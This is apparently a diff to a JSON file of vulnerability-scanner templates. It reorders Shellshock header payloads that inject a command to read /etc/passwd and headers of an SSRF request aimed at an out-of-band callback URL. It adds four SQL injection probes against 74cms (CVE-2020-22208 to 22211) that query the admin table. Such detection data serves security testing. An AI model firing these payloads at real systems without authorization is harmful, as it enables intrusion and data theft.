@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -9510,8 +9510,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10828,6 +10828,66 @@
           "path": [
             "{{BaseURL}}/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample",
             "{{BaseURL}}/jenkins/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-22208",
+      "info": {
+        "name": "74cms - Sql Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plus/ajax_street.php?act=alphabet&x=11�'%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,md5({{randstr}}),9%20from%20qs_admin#"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-22209",
+      "info": {
+        "name": "74cms - Sql Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plus/ajax_common.php?act=hotword&query=aa%錦%27%20union%20select%201,md5({{randstr}}),3%23%27"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-22210",
+      "info": {
+        "name": "74cms - Sql Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{randstr}}),5,6,7,8,9%23"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-22211",
+      "info": {
+        "name": "74cms Sql Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plus/ajax_street.php?act=key&key=%E9%8C%A6%27%20union%20select%201,2,3,4,5,6,7,md5({{randstr}}),9%23"
           ]
         }
       ]
